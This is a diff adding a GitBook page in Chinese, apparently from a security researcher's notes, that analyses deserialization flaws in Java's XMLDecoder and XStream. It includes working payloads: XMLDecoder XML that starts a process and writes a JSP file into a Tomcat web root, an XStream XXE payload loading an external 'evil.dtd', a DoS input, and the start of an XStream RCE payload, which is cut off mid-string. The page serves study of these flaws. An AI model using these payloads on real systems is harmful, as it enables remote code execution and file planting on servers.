@@ -1,0 +1,2297 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Java XML反序列化漏洞 · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="ROME逐步分析.html" />
+    
+    
+    <link rel="prev" href="CommonsCollections逐步分析.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="CommonsCollections逐步分析.html">
+            
+                <a href="CommonsCollections逐步分析.html">
+            
+                    
+                    CommonsCollections逐步分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.3" data-path="Java XML反序列化漏洞.html">
+            
+                <a href="Java XML反序列化漏洞.html">
+            
+                    
+                    Java XML反序列化漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="ROME逐步分析.html">
+            
+                <a href="ROME逐步分析.html">
+            
+                    
+                    ROME逐步分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="javatest.html">
+            
+                <a href="javatest.html">
+            
+                    
+                    Java相关题型复现
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >Java XML反序列化漏洞</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="java-xml&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;">Java XML&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;</h1>
+<p>&#x4F8B;&#x4E3E;&#x51FA;&#x51E0;&#x4E2A;&#x51E0;&#x4E2A; XML &#x548C; YAML &#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x3002;</p>
+<ol>
+<li>XMLDecoder</li>
+<li>XStream</li>
+<li>SnakeYaml</li>
+</ol>
+<p>&#x5728;&#x6211;&#x9047;&#x5230;&#x7684;&#x9879;&#x76EE;&#x91CC;&#xFF0C;&#x8FD9;&#x4E09;&#x4E2A;&#x4F9D;&#x8D56;&#x5E93;&#x6700;&#x5E38;&#x89C1;&#x3002;</p>
+<p>&#x5176;&#x4E2D; XMLDecoder &#x4E0D;&#x540C;&#x4E8E;&#x5176;&#x4ED6;&#x51E0;&#x4E2A;&#xFF0C;&#x8FD9;&#x4E2A;&#x66F4;&#x50CF;&#x662F;&#x53CD;&#x5C04;&#x6F0F;&#x6D1E;&#xFF0C;&#x867D;&#x7136;&#x672C;&#x8D28;&#x4E0A;&#x90FD;&#x662F;&#x53EF;&#x4EE5;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x56DE;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4F46; XMLDecoder &#x548C; XStream &#x53EF;&#x4EE5;&#x81EA;&#x7531;&#x7684;&#x63A7;&#x5236;&#x7C7B;&#x3001;&#x65B9;&#x6CD5;&#x3001;&#x53C2;&#x6570;&#xFF0C;SnakeYaml &#x4E00;&#x7C7B;&#x5C31;&#x540C; Jackson &#x548C; fastjson &#x4E00;&#x6837;&#xFF0C;&#x672C;&#x8D28;&#x4E0A;&#x662F;&#x8C03;&#x7528;&#x4E86; get&#x3001;set &#x548C;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x3002;</p>
+<h2 id="weblogic-debug">weblogic debug</h2>
+<p>Reference:</p>
+<ul>
+<li><a href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html" target="_blank">https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html</a></li>
+<li><a href="https://blog.csdn.net/Munch_D_Rudy/article/details/122459667" target="_blank">https://blog.csdn.net/Munch_D_Rudy/article/details/122459667</a></li>
+</ul>
+<p>debug&#x70B9;&#x5728;<code>test\weblogic.jar!\weblogic\wsee\jaxws\WLSServletAdapter.class:129</code></p>
+<p>&#x6700;&#x540E;&#x8BBF;&#x95EE;&#x8BE5;&#x7F51;&#x5740;&#x6D4B;&#x8BD5;&#x662F;&#x5426;debug</p>
+<pre><code>http://localhost:7001/wls-wsat/CoordinatorPortType
+</code></pre><h2 id="xmldecoder">XMLDecoder</h2>
+<p>Encode</p>
+<pre><code class="lang-java"><span class="hljs-keyword">import</span> java.beans.XMLEncoder;
+<span class="hljs-keyword">import</span> java.util.ArrayList;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Encode</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>{
+        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
+        map.put(<span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-string">&quot;hhh&quot;</span>);
+        map.put(<span class="hljs-string">&quot;321&quot;</span>, <span class="hljs-keyword">new</span> ArrayList&lt;&gt;());
+
+        XMLEncoder xmlEncoder = <span class="hljs-keyword">new</span> XMLEncoder(System.out);
+        xmlEncoder.writeObject(map);
+        xmlEncoder.close();
+    }
+}
+</code></pre>
+<p>&#x4F1A;&#x5F97;&#x5230;&#x4E00;&#x6BB5;&#x7528; XMLEncoder &#x751F;&#x6210; hashmap &#x5BF9;&#x8C61; xml &#x7684;&#x4EE3;&#x7801; </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;java version=&quot;1.8.0_171&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+ &lt;object class=&quot;java.util.HashMap&quot;&gt;
+  &lt;void method=&quot;put&quot;&gt;
+   &lt;string&gt;123&lt;/string&gt;
+   &lt;string&gt;hhh&lt;/string&gt;
+  &lt;/void&gt;
+  &lt;void method=&quot;put&quot;&gt;
+   &lt;string&gt;321&lt;/string&gt;
+   &lt;object class=&quot;java.util.ArrayList&quot;/&gt;
+  &lt;/void&gt;
+ &lt;/object&gt;
+&lt;/java&gt;
+</code></pre><p>&#x518D;&#x62FF;&#x8FD9;&#x4E2A;&#x751F;&#x6210;&#x7684;xml&#xFF0C;&#x7528;XMLDecoder&#x89E3;&#x6790; </p>
+<pre><code class="lang-java"><span class="hljs-keyword">import</span> java.beans.XMLDecoder;
+<span class="hljs-keyword">import</span> java.beans.XMLEncoder;
+<span class="hljs-keyword">import</span> java.io.StringBufferInputStream;
+<span class="hljs-keyword">import</span> java.util.ArrayList;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Decode</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>{
+        String s = <span class="hljs-string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;&lt;java version=\&quot;1.8.0_171\&quot; class=\&quot;java.beans.XMLDecoder\&quot;&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot; &lt;object class=\&quot;java.util.HashMap\&quot;&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;  &lt;void method=\&quot;put\&quot;&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;   &lt;string&gt;123&lt;/string&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;   &lt;string&gt;hhh&lt;/string&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;  &lt;/void&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;  &lt;void method=\&quot;put\&quot;&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;   &lt;string&gt;321&lt;/string&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;   &lt;object class=\&quot;java.util.ArrayList\&quot;/&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;  &lt;/void&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot; &lt;/object&gt;\n&quot;</span> +
+                <span class="hljs-string">&quot;&lt;/java&gt;&quot;</span>;
+        StringBufferInputStream stringBufferInputStream = <span class="hljs-keyword">new</span> StringBufferInputStream(s);
+        XMLDecoder xmlDecoder = <span class="hljs-keyword">new</span> XMLDecoder(stringBufferInputStream);
+        Object o = xmlDecoder.readObject();
+        System.out.println(o);
+    }
+}
+</code></pre>
+<p>&#x6210;&#x529F;&#x628A;&#x521A;&#x624D;&#x7684;map&#x5BF9;&#x8C61;&#x7ED9;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x56DE;&#x6765;&#x4E86; </p>
+<pre><code>{123=hhh, 321=[]}
+</code></pre><p>&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x5176;&#x5199;&#x6CD5;&#x53BB;&#x6267;&#x884C;&#x4EE3;&#x7801;</p>
+<pre><code>&lt;java version=&quot;1.8.0_171&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+ &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;
+  &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt;
+   &lt;void index=&quot;0&quot;&gt;
+    &lt;string&gt;calc.exe&lt;/string&gt;
+   &lt;/void&gt;
+  &lt;/array&gt;
+  &lt;void method=&quot;start&quot;&gt;
+  &lt;/void&gt;
+ &lt;/object&gt;
+&lt;/java&gt;
+</code></pre><p>&#x76F8;&#x5F53;&#x4E8E;&#x6267;&#x884C;&#x4E86;</p>
+<pre><code>new java.lang.ProcessBuilder(new String[]{&quot;calc&quot;}).start();
+</code></pre><p>&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x6839;&#x636E;weblogic XMLDecoder&#x7684;&#x4E00;&#x4E9B;payload&#x63A8;&#x65AD;&#x6267;&#x884C;&#x7684;&#x4EE3;&#x7801;</p>
+<pre><code>&lt;java version=&quot;1.8.0_192&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+&lt;object class=&quot;java.io.PrintWriter&quot;&gt;
+&lt;string&gt;/usr/local/tomcat/webapps/ROOT/static/ricky.jsp&lt;/string&gt;
+&lt;void method=&quot;println&quot;&gt;
+&lt;string&gt;&lt;![CDATA[ricky]]&gt;&lt;/string&gt;
+&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;
+&lt;/object&gt;
+&lt;/java&gt;
+</code></pre><p>&#x76F8;&#x5F53;&#x4E8E;&#x6267;&#x884C;&#x4E86;</p>
+<pre><code>java.io.PrintWriter x = new java.io.PrintWriter(&quot;/usr/local/tomcat/webapps/ROOT/static/ricky.jsp&quot;);
+x.println(&quot;ricky&quot;);
+x.close();
+</code></pre><h3 id="&#x6D41;&#x7A0B;&#x5206;&#x6790;">&#x6D41;&#x7A0B;&#x5206;&#x6790;</h3>
+<p>&#x6574;&#x4F53;&#x6D41;&#x7A0B;</p>
+<pre><code>XMLDecoder.readObject()
+  XMLDecoder.parsingCompelete()
+    DocumentHandler.parse()       
+      SAXParserFactory.newInstance().newSAXParser().parse()
+        xmlReader.parse()
+</code></pre><p>XMLDecoder&#x7C7B;&#x89E3;&#x6790;XML&#x662F;&#x8C03;&#x7528;DocumentHandler&#x7C7B;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x800C;DocumentHandler&#x7C7B;&#x662F;&#x57FA;&#x4E8E;SAXParser&#x7C7B;&#x5BF9;XML&#x7684;&#x89E3;&#x6790;&#x4E0A;&#x7684;,  DocumentHandler&#x7C7B;&#x662F;XMLDecoder&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x7684;&#x6839;&#x6E90;&#x7C7B; </p>
+<p>&#x901A;&#x8FC7;readObject&#x8FDB;&#x5165;parsingComplete</p>
+<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">parsingComplete</span><span class="hljs-params">()</span> </span>{
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.input == <span class="hljs-keyword">null</span>) {
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+        }
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.array == <span class="hljs-keyword">null</span>) {
+            <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">this</span>.acc == <span class="hljs-keyword">null</span>) &amp;&amp; (<span class="hljs-keyword">null</span> != System.getSecurityManager())) {
+                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SecurityException(<span class="hljs-string">&quot;AccessControlContext is not set&quot;</span>);
+            }
+            AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction&lt;Void&gt;() {
+                <span class="hljs-function"><span class="hljs-keyword">public</span> Void <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>{
+                    XMLDecoder.<span class="hljs-keyword">this</span>.handler.parse(XMLDecoder.<span class="hljs-keyword">this</span>.input);
+                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
+                }
+            }, <span class="hljs-keyword">this</span>.acc);
+            <span class="hljs-keyword">this</span>.array = <span class="hljs-keyword">this</span>.handler.getObjects();
+        }
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
+    }
+</code></pre>
+<p>&#x63A5;&#x7740;&#x8C03;&#x7528;XMLDecoder.this.handler.parse&#x65B9;&#x6CD5;, &#x9ED8;&#x8BA4;&#x7684;handler</p>
+<pre><code>private final DocumentHandler handler = new DocumentHandler();
+</code></pre><p>&#x4E8E;&#x662F;&#x8DDF;&#x8FDB;DocumentHandler#parse</p>
+<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">parse</span><span class="hljs-params">(<span class="hljs-keyword">final</span> InputSource var1)</span> </span>{
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.acc == <span class="hljs-keyword">null</span> &amp;&amp; <span class="hljs-keyword">null</span> != System.getSecurityManager()) {
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SecurityException(<span class="hljs-string">&quot;AccessControlContext is not set&quot;</span>);
+        } <span class="hljs-keyword">else</span> {
+            AccessControlContext var2 = AccessController.getContext();
+            SharedSecrets.getJavaSecurityAccess().doIntersectionPrivilege(<span class="hljs-keyword">new</span> PrivilegedAction&lt;Void&gt;() {
+                <span class="hljs-function"><span class="hljs-keyword">public</span> Void <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>{
+                    <span class="hljs-keyword">try</span> {
+                        SAXParserFactory.newInstance().newSAXParser().parse(var1, DocumentHandler.<span class="hljs-keyword">this</span>);
+                    } <span class="hljs-keyword">catch</span> (ParserConfigurationException var3) {
+                        DocumentHandler.<span class="hljs-keyword">this</span>.handleException(var3);
+                    } <span class="hljs-keyword">catch</span> (SAXException var4) {
+                        Object var2 = var4.getException();
+                        <span class="hljs-keyword">if</span> (var2 == <span class="hljs-keyword">null</span>) {
+                            var2 = var4;
+                        }
+
+                        DocumentHandler.<span class="hljs-keyword">this</span>.handleException((Exception)var2);
+                    } <span class="hljs-keyword">catch</span> (IOException var5) {
+                        DocumentHandler.<span class="hljs-keyword">this</span>.handleException(var5);
+                    }
+
+                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
+                }
+            }, var2, <span class="hljs-keyword">this</span>.acc);
+        }
+    }
+</code></pre>
+<p>&#x8DDF;&#x8FDB; SAXParserFactory.newInstance().newSAXParser().parse, &#x4E00;&#x5F00;&#x59CB;&#x662F;&#x901A;&#x8FC7; SAXParserFactory.newInstance() &#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A; SAXParserFactoryImpl &#x5B9E;&#x4F8B;, &#x8C03;&#x7528;&#x5176; newSAXParser &#x65B9;&#x6CD5;</p>
+<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> SAXParser <span class="hljs-title">newSAXParser</span><span class="hljs-params">()</span>
+        <span class="hljs-keyword">throws</span> ParserConfigurationException
+    </span>{
+        SAXParser saxParserImpl;
+        <span class="hljs-keyword">try</span> {
+            saxParserImpl = <span class="hljs-keyword">new</span> SAXParserImpl(<span class="hljs-keyword">this</span>, features, fSecureProcess);
+        } <span class="hljs-keyword">catch</span> (SAXException se) {
+            <span class="hljs-comment">// Translate to ParserConfigurationException</span>
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ParserConfigurationException(se.getMessage());
+        }
+        <span class="hljs-keyword">return</span> saxParserImpl;
+    }
+</code></pre>
+<p>&#x5F88;&#x660E;&#x663E;, &#x8FD4;&#x56DE;&#x7684;&#x662F;&#x4E00;&#x4E2A; SAXParserImpl &#x5B9E;&#x4F8B;, &#x4E8E;&#x662F;&#x8DDF;&#x8FDB; SAXParserImpl#parse</p>
+<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">parse</span><span class="hljs-params">(InputSource is, DefaultHandler dh)</span>
+        <span class="hljs-keyword">throws</span> SAXException, IOException </span>{
+        <span class="hljs-keyword">if</span> (is == <span class="hljs-keyword">null</span>) {
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException();
+        }
+        <span class="hljs-keyword">if</span> (dh != <span class="hljs-keyword">null</span>) {
+            xmlReader.setContentHandler(dh);
+            xmlReader.setEntityResolver(dh);
+            xmlReader.setErrorHandler(dh);
+            xmlReader.setDTDHandler(dh);
+            xmlReader.setDocumentHandler(<span class="hljs-keyword">null</span>);
+        }
+        xmlReader.parse(is);
+    }
+</code></pre>
+<p>&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB; SAXParserImpl#parse</p>
+<pre><code class="lang-java">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">parse</span><span class="hljs-params">(InputSource inputSource)</span>
+            <span class="hljs-keyword">throws</span> SAXException, IOException </span>{
+            <span class="hljs-keyword">if</span> (fSAXParser != <span class="hljs-keyword">null</span> &amp;&amp; fSAXParser.fSchemaValidator != <span class="hljs-keyword">null</span>) {
+                <span class="hljs-keyword">if</span> (fSAXParser.fSchemaValidationManager != <span class="hljs-keyword">null</span>) {
+                    fSAXParser.fSchemaValidationManager.reset();
+                    fSAXParser.fUnparsedEntityHandler.reset();
+                }
+                resetSchemaValidator();
+            }
+            <span class="hljs-keyword">super</span>.parse(inputSource);
+        }
+</code></pre>
+<p>&#x8DDF;&#x8FDB;AbstractSAXParser#parse&#x540E;&#x518D;&#x8DDF;&#x8FDB;XMLParser#parse, &#x7136;&#x540E;&#x5F80;&#x4E0B;&#x8D70;&#x4F1A;&#x6765;&#x5230;XML11Configuration#parse</p>
+<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">parse</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> complete)</span> <span class="hljs-keyword">throws</span> XNIException, IOException </span>{
+        <span class="hljs-comment">//</span>
+        <span class="hljs-comment">// reset and configure pipeline and set InputSource.</span>
+        <span class="hljs-keyword">if</span> (fInputSource != <span class="hljs-keyword">null</span>) {
+            <span class="hljs-keyword">try</span> {
+                fValidationManager.reset();
+                fVersionDetector.reset(<span class="hljs-keyword">this</span>);
+                fConfigUpdated = <span class="hljs-keyword">true</span>;
+                resetCommon();
+
+                <span class="hljs-keyword">short</span> version = fVersionDetector.determineDocVersion(fInputSource);
+                <span class="hljs-keyword">if</span> (version == Constants.XML_VERSION_1_1) {
+                    initXML11Components();
+                    configureXML11Pipeline();
+                    resetXML11();
+                } <span class="hljs-keyword">else</span> {
+                    configurePipeline();
+                    reset();
+                }
+
+                <span class="hljs-comment">// mark configuration as fixed</span>
+                fConfigUpdated = <span class="hljs-keyword">false</span>;
+
+                <span class="hljs-comment">// resets and sets the pipeline.</span>
+                fVersionDetector.startDocumentParsing((XMLEntityHandler) fCurrentScanner, version);
+                fInputSource = <span class="hljs-keyword">null</span>;
+            } <span class="hljs-keyword">catch</span> (XNIException ex) {
+                <span class="hljs-keyword">if</span> (PRINT_EXCEPTION_STACK_TRACE)
+                    ex.printStackTrace();
+                <span class="hljs-keyword">throw</span> ex;
+            } <span class="hljs-keyword">catch</span> (IOException ex) {
+                <span class="hljs-keyword">if</span> (PRINT_EXCEPTION_STACK_TRACE)
+                    ex.printStackTrace();
+                <span class="hljs-keyword">throw</span> ex;
+            } <span class="hljs-keyword">catch</span> (RuntimeException ex) {
+                <span class="hljs-keyword">if</span> (PRINT_EXCEPTION_STACK_TRACE)
+                    ex.printStackTrace();
+                <span class="hljs-keyword">throw</span> ex;
+            } <span class="hljs-keyword">catch</span> (Exception ex) {
+                <span class="hljs-keyword">if</span> (PRINT_EXCEPTION_STACK_TRACE)
+                    ex.printStackTrace();
+                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> XNIException(ex);
+            }
+        }
+</code></pre>
+<p>determineDocVersion()&#x4E3B;&#x8981;&#x83B7;&#x53D6;XML&#x5B9E;&#x4F53;&#x626B;&#x63CF;&#x5668;&#x7136;&#x540E;&#x626B;&#x63CF;&#x89E3;&#x6790; <code>&lt;?xml version=&#x2026;?&gt;</code> &#x6765;&#x83B7;&#x53D6;XML&#x6587;&#x6863;&#x7684;&#x7248;&#x672C;&#x4FE1;&#x606F; </p>
+<p>&#x8FD4;&#x56DE;&#x7248;&#x672C;&#x4FE1;&#x606F;&#x540E;&#xFF0C;&#x7EE7;&#x7EED;&#x5F80;&#x4E0B;&#x5728;XML11Configuration.parse()&#x4E2D;&#x8C03;&#x7528;startDocumentParsing()&#x51FD;&#x6570;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x91CD;&#x7F6E;&#x626B;&#x63CF;&#x5668;&#x7684;&#x7248;&#x672C;&#x914D;&#x7F6E;&#x5E76;&#x5F00;&#x59CB;&#x6587;&#x4EF6;&#x626B;&#x63CF;&#x51C6;&#x5907;&#xFF0C;&#x5176;&#x4E2D;&#x5F00;&#x59CB;&#x6587;&#x4EF6;&#x626B;&#x63CF;&#x51C6;&#x5907;&#x662F;&#x8C03;&#x7528;startEntity()&#x51FD;&#x6570;&#xFF08;&#x8DDF;&#x8E2A;&#x8FDB;&#x53BB;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x662F;&#x901A;&#x77E5;&#x626B;&#x63CF;&#x5668;&#x5F00;&#x59CB;&#x5B9E;&#x4F53;&#x626B;&#x63CF;&#xFF0C;&#x5176;&#x4E2D;&#x6587;&#x6863;&#x5B9E;&#x4F53;&#x7684;&#x4F2A;&#x540D;&#x79F0;&#x4E3A;&quot;[xml]&quot;&#x3001;DTD&#x7684;&#x4F2A;&#x540D;&#x79F0;&#x4E3A;&quot;[dtd]&quot;&#x3001;&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x540D;&#x79F0;&#x4EE5;&quot;%&quot;&#x5F00;&#x5934;&#xFF1B;&#x63A5;&#x7740;&#x51FD;&#x6570;&#x5185;&#x90E8;&#x4F1A;&#x8C03;&#x7528;startDocument()&#x51FD;&#x6570;&#x5F00;&#x59CB;&#x51C6;&#x5907;&#x6587;&#x4EF6;&#x626B;&#x63CF;&#xFF09;, &#x6700;&#x540E;&#x4F1A;&#x5230; ObjectElementHandler#getValueObject &#x521B;&#x5EFA;&#x5B9E;&#x4F8B;</p>
+<p><img src="img/1644346253263.png" alt="1644346253263"></p>
+<p>&#x6700;&#x540E;&#x89E3;&#x6790;&#x5230;void&#x6807;&#x7B7E;&#x83B7;&#x53D6;&#x5230;start&#x65B9;&#x6CD5;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x8C03;&#x7528;start&#x65B9;&#x6CD5;&#x5B9E;&#x73B0;&#x4E86;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
+<h2 id="xstream">XStream</h2>
+<p>XStream &#x548C; XMLDecoder &#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x90FD;&#x662F; Java &#x5BF9;&#x8C61;&#x548C; XML &#x4E92;&#x8F6C;&#x7684;&#x5E93;&#xFF0C;&#x5728;&#x5BA1;&#x8BA1;java&#x9879;&#x76EE;&#x65F6;&#x4E5F;&#x7ECF;&#x5E38;&#x80FD;&#x89C1;&#x5230;&#x3002;&#x6BD4;&#x8F83;&#x51FA;&#x540D;&#x7684;&#x51E0;&#x4E2A;&#x9879;&#x76EE; Bamboo &#x3001;Struts2 &#x3001;Jenkins &#x90FD;&#x6709;&#x7528;&#x5230;&#x5B83;&#xFF0C;&#x4E14;&#x66DD;&#x51FA;&#x8FC7;&#x6F0F;&#x6D1E;&#x3002;</p>
+<p>XStream &#x6709;&#x51E0;&#x4E2A; CVE &#xFF0C;&#x5206;&#x522B;&#x662F; RCE&#x3001;XXE&#x3001;DOS&#x3002;</p>
+<h3 id="xxe">XXE</h3>
+<p>&#x5F71;&#x54CD; 1.4.8 &#x53CA;&#x4E4B;&#x524D;&#x7248;&#x672C;</p>
+<pre><code>com.thoughtworks.xstream.io.xml.DomDriver domDriver = new com.thoughtworks.xstream.io.xml.DomDriver();
+String x = &quot;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;\n&quot; +
+           &quot;&lt;!ENTITY  % xxe SYSTEM \&quot;http://127.0.0.1:2333/evil.dtd\&quot; &gt;\n&quot; +
+           &quot;%xxe;]&gt;\n&quot; +
+           &quot;&lt;foo&gt;1&lt;/foo&gt;&quot;;
+domDriver.createReader(new StringReader(x));
+</code></pre><p>&#x6F0F;&#x6D1E;&#x53C2;&#x8003; <a href="http://x-stream.github.io/CVE-2016-3674.html" target="_blank">http://x-stream.github.io/CVE-2016-3674.html</a> </p>
+<h3 id="dos">DOS</h3>
+<p>&#x5F71;&#x54CD; 1.4.9 &#x53CA;&#x4E4B;&#x524D;&#x7248;&#x672C; </p>
+<pre><code>XStream xstream = new XStream();
+xstream.fromXML(&quot;&lt;void/&gt;&quot;);
+xstream.fromXML(&quot;&lt;string class=&apos;void&apos;&gt;Hello, world!&lt;/string&gt;&quot;);
+</code></pre><h3 id="rce">RCE</h3>
+<p>&#x5B83;&#x7684; CVE &#x7F16;&#x53F7;&#x662F; CVE-2013-7285&#xFF0C;&#x53EF;&#x4EE5;&#x5F71;&#x54CD;&#x5230; 1.4.10 &#x7248;&#x672C;&#x3002;&#x8FD8;&#x6709; CVE-2019-10173&#x3002;</p>
+<p>1.4.10 &#x7248;&#x672C;&#x66F4;&#x65B0;&#x7684;&#x65F6;&#x5019;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;&#x901A;&#x8FC7; XStream.setupDefaultSecurity &#x65B9;&#x6CD5;&#x521D;&#x59CB;&#x5316;&#x5B89;&#x5168;&#x6846;&#x67B6;&#x7684;&#x529F;&#x80FD;&#x3002;&#x4F46;&#x9ED8;&#x8BA4;&#x4E0D;&#x88AB;&#x8C03;&#x7528;&#xFF0C;&#x4F9D;&#x7136;&#x53EF;&#x4EE5;&#x653B;&#x51FB; 1.4.10 &#x7248;&#x672C;&#x7684; XStream&#x3002;</p>
+<pre><code>import com.thoughtworks.xstream.XStream;
+
+public class xstream {
+    public static void main(String[] args) {
+        XStream xstream = new XStream();
+        String x = &quot;&lt;sorted-set&gt;\n&quot; +
+                &quot;    &lt;dynamic-proxy&gt;\n&quot; +
+                &quot;        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot; +
